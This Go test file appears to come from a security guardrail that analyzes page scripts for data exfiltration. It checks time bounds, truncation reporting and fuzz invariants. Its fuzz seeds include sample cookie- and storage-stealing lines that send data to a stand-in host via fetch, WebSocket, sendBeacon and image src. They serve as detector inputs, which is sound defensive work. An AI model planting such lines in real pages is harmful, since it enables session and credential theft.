// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package toolshape

import (
	"math"
	"strings"
	"testing"
	"time"

	"github.com/defenseclaw/defenseclaw/internal/guardrail/bounded"
)

// worstScripts are page scripts of the largest size the reader accepts, built
// to make its passes repeat: nested calls whose argument ranges all end at the
// end of the script, a chain of assignments whose right sides all end there,
// and a name assigned many times and sent to by calls. Each carries the caps
// the reading must report: a script whose passes would cost tokens squared
// spends the work budget and is TRUNCATED (bounded.Time), never read in part
// and called clean; a script of linear cost is read whole.
type worstScript struct {
	code string
	caps []bounded.Cap // every one must be reported; none: the reading is not truncated
}

func worstScripts() map[string]worstScript {
	read := "const s = document.cookie;\n"
	n := 20000
	over := []bounded.Cap{bounded.Time}
	return map[string]worstScript{
		"assign-chain":         {read + strings.Repeat("x=", 30000) + "1", over},
		"nested-fetch":         {read + strings.Repeat("fetch(", n) + "1" + strings.Repeat(")", n), over},
		"nested-fetch-open":    {read + strings.Repeat("fetch(", n), over},
		"nested-fetch-tainted": {read + strings.Repeat("fetch(s+", n/2) + "1" + strings.Repeat(")", n/2), []bounded.Cap{bounded.Items}},
		"nested-defined-call":  {read + "function f(a){return a}\n" + strings.Repeat("f(", n) + "1" + strings.Repeat(")", n), over},
		"nested-goto":          {read + "fetch(s);" + strings.Repeat("p.goto(", n) + "1" + strings.Repeat(")", n), over},
		"src-chain":            {read + strings.Repeat("a.src=", 20000) + "1", over},
		"bound-once":           {read + strings.Repeat("x=", 20000) + "1;" + strings.Repeat("fetch(x+s);", 1500), over},
		"bound-many-64":        {read + strings.Repeat("x=", 20000) + "1;" + strings.Repeat("fetch(x+s);", 64), over},
		"setattr-nested":       {read + strings.Repeat("a.setAttribute(", n/2) + "1" + strings.Repeat(")", n/2), over},
		"then-chain":           {read + "q" + strings.Repeat(".then(p=>p)", 8000), []bounded.Cap{bounded.Items, bounded.Nodes}},
		"for-of":               {read + strings.Repeat("for(const c of ", 10000) + "1", over},
		"ws-new":               {read + strings.Repeat("new WebSocket(", 15000) + "1" + strings.Repeat(")", 15000), over},
		"brackets-unmatched":   {read + strings.Repeat("{", 60000), nil},
		"template-nest":        {read + strings.Repeat("`${", 20000), nil},
		"unicode-brace":        {read + "'" + strings.Repeat("\\u{", 60000) + "'", nil},
	}
}

// workUnitScript spends one whole work budget in the cheapest scan and is read
// whole: nested calls still open at the end, each of whose argument scans
// crosses the rest of the script (the gateway work lane pins the last size read
// whole, pageScriptWorkLimit 1448; this one stays just under it).
func workUnitScript() string {
	return "const s = document.cookie;\n" + strings.Repeat("fetch(", 1440)
}

// maxWorkUnits is how many work units the reading of one worst script may
// cost. Each spends at most one work budget plus its linear passes (lexing,
// bracket pairing): at most 1.7 units on every shape at GOMAXPROCS 2 and 4,
// plain and under -race with atomic coverage alike. A pass that ignores the
// budget costs a multiple of the script's size per token and lands far above;
// doubling the cost of the budgeted work lands above too.
const maxWorkUnits = 3.0

// timed is the wall time of one reading of code.
func timed(code string) (time.Duration, PageFlow) {
	start := time.Now()
	flow := AnalyzePageScript(code)
	return time.Since(start), flow
}

// workUnits is the cost of reading code in work units, the unit timed right
// before it in the same process: a slow runner, the race detector and coverage
// counters (up to 240 times plain, GitHub CI #1456) scale both alike. Over the
// bound it is measured twice more and the lowest reading kept, as one reading
// on a shared runner can stall.
func workUnits(t *testing.T, code string) (float64, time.Duration, PageFlow) {
	t.Helper()
	best, bestD := math.Inf(1), time.Duration(0)
	var flow PageFlow
	for try := 0; try < 3 && best > maxWorkUnits; try++ {
		unit, ref := timed(workUnitScript())
		if ref.Truncated.Any() {
			t.Fatalf("the work unit script is truncated (%v): it must spend the budget and be read whole", ref.Truncated)
		}
		d, f := timed(code)
		if u := float64(d) / float64(unit); u < best {
			best, bestD, flow = u, d, f
		}
	}
	return best, bestD, flow
}

// The work budget cuts a script built to make every pass cross the rest of the
// script, and says so (bounded.Time); none of these costs more than a few work
// units. The cut is asserted, not only logged: a reader that stopped early
// without the mark would read part of a script and call the rest clean.
func TestPageScriptWorstCaseTime(t *testing.T) {
	for name, w := range worstScripts() {
		units, d, flow := workUnits(t, w.code)
		t.Logf("%-22s %7d bytes %10s %5.2f units sends=%d trunc=%v", name, len(w.code), d, units, len(flow.Sends), flow.Truncated)
		if units > maxWorkUnits {
			t.Errorf("%s: %s is %.2f work units (bound %.1f)", name, d, units, maxWorkUnits)
		}
		if len(w.caps) == 0 && flow.Truncated.Any() {
			t.Errorf("%s: a script of linear cost is truncated: %v", name, flow.Truncated)
		}
		for _, c := range w.caps {
			if !flow.Truncated.Has(c) {
				t.Errorf("%s: the %s cap is not reported (set %v)", name, c, flow.Truncated)
			}
		}
	}
}

// The callbacks of one long chain each walk back to the chain's first token;
// the walk is recorded, so the chain costs its length, not its length squared,
// and never spends the work budget (unrecorded, 3000 callbacks spend it). The
// chain is still TRUNCATED, by the definition and name bounds.
func TestPageScriptChainWalkIsLinear(t *testing.T) {
	for _, n := range []int{3000, 6000} {
		flow := AnalyzePageScript("const s = document.cookie;\nq" + strings.Repeat(".then(p=>p)", n))
		if flow.Truncated.Has(bounded.Time) {
			t.Errorf("%d callbacks spend the work budget: %v", n, flow.Truncated)
		}
		if !flow.Truncated.Has(bounded.Items) {
			t.Errorf("%d callbacks are not cut by the definition bound: %v", n, flow.Truncated)
		}
	}
}

// FuzzAnalyzePageScript: the reader never panics, its lists stay within their
// bounds and a host it reports is a bare lower-case host.
func FuzzAnalyzePageScript(f *testing.F) {
	for _, seed := range []string{
		"",
		"() => fetch('https://c.example.net/x?d=' + document.cookie)",
		"const s = localStorage.getItem('k'); navigator.sendBeacon(`https://${h}/p`, s)",
		"const x = new XMLHttpRequest(); x.open('POST', u); x.send(sessionStorage)",
		"const w = new WebSocket('wss://c.example.net'); w.send(document.cookie)",
		"a.src = 'https://c.example.net/' + document.cookie; b.setAttribute('action', document.cookie)",
		"await page.goto('https://app.example.org/'); const c = await page.context().cookies(); fetch(c)",
		"q.then(p => fetch(p)); for (const c of document.cookie) fetch(c)",
		"'\\u{41' + `${`${",
		"/* open",
		"fetch(" + strings.Repeat("(", 40),
	} {
		f.Add(seed)
	}
	for name, w := range worstScripts() {
		code := w.code
		if len(code) > 4096 {
			code = code[:4096]
		}
		f.Add(name + code)
	}
	f.Fuzz(func(t *testing.T, code string) {
		flow := AnalyzePageScript(code)
		if len(flow.Sends) > maxPageSends || len(flow.Gotos) > maxPageSends {
			t.Fatalf("lists over the bound: %d sends, %d gotos", len(flow.Sends), len(flow.Gotos))
		}
		for _, s := range flow.Sends {
			if s.Dest == DestHost && (s.Host == "" || s.Host != strings.ToLower(s.Host) || strings.ContainsAny(s.Host, "/?#@ ")) {
				t.Fatalf("host %q is not a bare host", s.Host)
			}
			if s.Dest != DestHost && s.Host != "" {
				t.Fatalf("send %+v has a host and no host destination", s)
			}
		}
		if len(code) > maxPageScript && !flow.Truncated.Has(bounded.Bytes) {
			t.Fatal("a script over the byte bound is not marked truncated")
		}
	})
}
